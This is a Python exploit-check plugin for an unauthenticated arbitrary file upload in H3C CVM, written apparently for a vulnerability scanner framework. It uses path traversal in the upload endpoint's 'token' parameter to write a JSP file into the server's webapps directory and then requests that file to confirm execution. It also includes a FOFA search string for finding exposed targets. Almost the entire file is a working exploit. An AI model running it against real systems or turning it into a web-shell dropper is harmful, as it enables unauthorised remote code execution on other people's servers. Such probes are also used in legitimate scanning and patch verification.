#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/Oqo-8D6sQltVfq2RfbQdfw',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'H3C CVM 前台任意文件上传',

      'level'     :   'critical',

      'FOFA'      :   'server="H3C-CVM"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(10)
  r1 = randomLowercase(15)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Range': 'bytes 0-10/20'
      }
  target = f'/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{r0}.jsp&name=222'
  data = f'<%out.print("{r1}");%>'
  url1 = url + target
  try:
    resp=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    # print(resp.text)
    if resp.status_code == 200 and re.search(r'message',resp.text,re.S):
      resp.close()
    else:
      return ret
  except:
    return ret
  try:
    payload = f'{url}/cas/js/lib/buttons/{r0}.jsp'
    res=requests.get(url=payload,headers=headers,timeout=7,verify=False)
    # print(res.text)
    if res.status_code == 200 and r1 in res.text:
      ret['huixian'] = f'漏洞验证地址：{payload}\n文件内容为:{r1}'
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret